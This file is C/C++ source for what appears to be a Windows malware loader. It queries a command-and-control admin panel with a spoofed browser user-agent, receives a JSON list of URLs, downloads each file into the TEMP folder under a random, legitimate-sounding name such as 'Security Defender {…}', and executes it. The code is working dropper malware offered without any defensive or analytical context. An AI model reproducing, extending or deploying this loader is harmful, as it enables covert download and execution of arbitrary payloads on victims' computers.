#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <cstdint>
#include <shlwapi.h>
#include <wininet.h>
#include "parson.h"
#include "fncs.h"
#include "mem.h"
#include "ldr.h"

char* _itoa(int i, char b[]) {
	char const digit[] = "0123456789";
	char* p = b;
	if (i < 0) {
		*p++ = '-';
		i *= -1;
	}
	int shifter = i;
	do {
		++p;
		shifter = shifter / 10;
	} while (shifter);
	*p = '\0';
	do {
		*--p = digit[i % 10];
		i = i / 10;
	} while (i);
	return b;
}

void downloadFile(LPCWSTR path, LPCSTR link) {
	BOOL bResult;
	DWORD dwBytesRead = 1;

	if (HINTERNET hInternetSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)) {
		if (HINTERNET hURL = InternetOpenUrlA(hInternetSession, link, 0, 0, 0, 0)) {
			if (char* buf = (char*)_alloc(1024)) {
				DWORD dwTemp;
				HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

				if (INVALID_HANDLE_VALUE == hFile) {
					return;
				}

				while (dwBytesRead > 0)
				{
					InternetReadFile(hURL, buf, (DWORD)1024, &dwBytesRead);
					WriteFile(hFile, buf, dwBytesRead, &dwTemp, NULL);
				}

				_free(buf);

				InternetCloseHandle(hURL);
				InternetCloseHandle(hInternetSession);

				CloseHandle(hFile);
			}
		}
	}
}

int crand() {
	BYTE pbData[1];
	HCRYPTPROV hCryptProv;
	if (CryptAcquireContextW(&hCryptProv, NULL, L"Microsoft Base Cryptographic Provider v1.0", PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
		if (CryptAcquireContextW(&hCryptProv, NULL, L"Microsoft Base Cryptographic Provider v1.0", PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
		{
			if (CryptGenRandom(hCryptProv, 1, pbData))
			{
				CryptReleaseContext(hCryptProv, 0);
				return pbData[0];
			}
		}
	}

	return 0;
}

LPCWSTR getName() {
	WCHAR charlist[] = {
		L'A', L'B', L'C', L'D', L'E', L'F',
		L'G', L'H', L'I', L'J', L'K', L'L',
		L'M', L'N', L'O', L'P', L'Q', L'R',
		L'S', L'T', L'U', L'V', L'W', L'X',
		L'Y', L'Z', L'0', L'1', L'2', L'3',
		L'4', L'5', L'6', L'7', L'8', L'9'
	};

	LPCWSTR list[] = {
		L"System", L"Process", L"Update", L"Memory", L"Browser",
		L"Security", L"Defender", L"Monitor", L"Protector", L"Optimization",
		L"Finder", L"Zip"
	};

	int a = crand() % (_countof(list) - 1);
	int b = crand() % (_countof(list) - 1);
	while (a == b) b = crand() % (_countof(list) - 1);

	int alcsize = (lstrlenW(list[a]) + lstrlenW(list[b]) + 14) * sizeof(WCHAR);

	LPCWSTR buf = (WCHAR*)_alloc(alcsize);
	WCHAR c1 = charlist[crand() % 35];
	WCHAR c2 = charlist[crand() % 35];
	WCHAR c3 = charlist[crand() % 35];
	WCHAR c4 = charlist[crand() % 35];
	WCHAR c5 = charlist[crand() % 35];
	WCHAR c6 = charlist[crand() % 35];
	WCHAR c7 = charlist[crand() % 35];
	WCHAR c8 = charlist[crand() % 35];
	WCHAR c9 = charlist[crand() % 35];

	wnsprintfW((WCHAR*)buf, alcsize, L"%s %s {%c%c%c%c%c%c%c%c%c}", list[a], list[b], c1, c2, c3, c4, c5, c6, c7, c8, c9);
	return buf;
}

LPCWSTR generateFilePath() {
	LPWSTR Temp = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
	LPWSTR ExecuteFilePath = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
	LPCWSTR fileName = getName();

	GetEnvironmentVariableW(L"TEMP", Temp, MAX_PATH * sizeof(WCHAR));
	wnsprintfW(ExecuteFilePath, MAX_PATH, L"%s\\%s.exe", Temp, fileName);

	_free(Temp);
	_free((WCHAR*)fileName);
	return ExecuteFilePath;
}

void runLdr() {
	CHAR* szBuffer = (CHAR*)_alloc(2048);

	if (HINTERNET hIntSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)) {
		if (HINTERNET hHttpSession = InternetConnectW(hIntSession, bitGetHostByName(ADMIN_PANEL), 80, 0, 0, INTERNET_SERVICE_HTTP, 0, NULL)) {
			if (HINTERNET hHttpRequest = HttpOpenRequestA(hHttpSession, "GET", LDR_URL, 0, 0, 0, INTERNET_FLAG_RELOAD, 0)) {
				if (HttpSendRequestA(hHttpRequest, "Content-Type: application/x-www-form-urlencoded", 24, NULL, NULL)) {

					DWORD dwRead = 0;
					while (InternetReadFile(hHttpRequest, szBuffer, 2048, &dwRead) && dwRead) {
						szBuffer[dwRead] = 0;
						dwRead = 0;
					}

					InternetCloseHandle(hHttpRequest);
					InternetCloseHandle(hHttpSession);
					InternetCloseHandle(hIntSession);
				}
			}
		}
	}

	JSON_Value *root_value = json_parse_string(szBuffer);

	char* integer = (char*)_alloc(MAX_PATH);
	JSON_Object *root_object = json_value_get_object(root_value);
	for (int i = 0; i < json_object_get_count(root_object); i++) {
		wnsprintfA(integer, MAX_PATH, "%u", i);
		const char* str = json_object_get_string(root_object, integer);

		LPCWSTR fp = generateFilePath();
		if (fp) {
			wprintf(fp);
			downloadFile(fp, str);
			ShellExecuteW(0, L"open", fp, 0, 0, SW_SHOW);
		}
		_free((void*)fp);
	}
	_free(integer);
	_free(szBuffer);
	json_value_free(root_value);
}